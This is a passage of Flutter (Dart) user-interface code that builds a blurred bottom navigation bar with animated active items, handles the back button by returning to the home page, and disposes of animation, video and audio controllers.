          border: Border.all(color: _glowColor1.withOpacity(0.1), width: 1),
          boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20)],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(22),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: navItems.map((item) {
                return _buildNavItem(item['icon'], item['label'], item['page']);
              }).toList(),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, String page) {
    bool isActive = _activePage == page;
    return GestureDetector(
      onTap: () => _selectPage(page),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
        decoration: isActive
            ? BoxDecoration(
                color: _glowColor1.withOpacity(0.1),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _glowColor1.withOpacity(0.25), width: 1),
              )
            : null,
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Icon(icon,
            color: isActive ? _glowColor1.withOpacity(0.9) : Colors.white.withOpacity(0.35),
            size: 22),
          if (isActive) ...[
            const SizedBox(height: 4),
            Text(label, style: TextStyle(color: _glowColor1.withOpacity(0.8), fontSize: 9, fontWeight: FontWeight.w800)),
          ],
        ]),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (_activePage != 'home') { _selectPage('home'); return false; }
        return true;
      },
      child: Scaffold(
        key: _scaffoldKey,
        extendBodyBehindAppBar: true,
        backgroundColor: _darkerBg,
        drawer: _buildSidebar(),
        body: Stack(
          children: [
            Container(color: _darkerBg),
            SafeArea(
              top: false, bottom: false,
              child: FadeTransition(opacity: _animation, child: _selectedPage),
            ),
            if (_activePage == 'home' || _activePage == 'settings')
              Positioned(top: 0, left: 0, right: 0, child: _buildHeader()),
            if (_showBottomNav) _buildBottomNavBar(),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _controller.dispose();
    _videoController?.dispose();
    _audioPlayer.dispose();
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
    super.dispose();
  }
}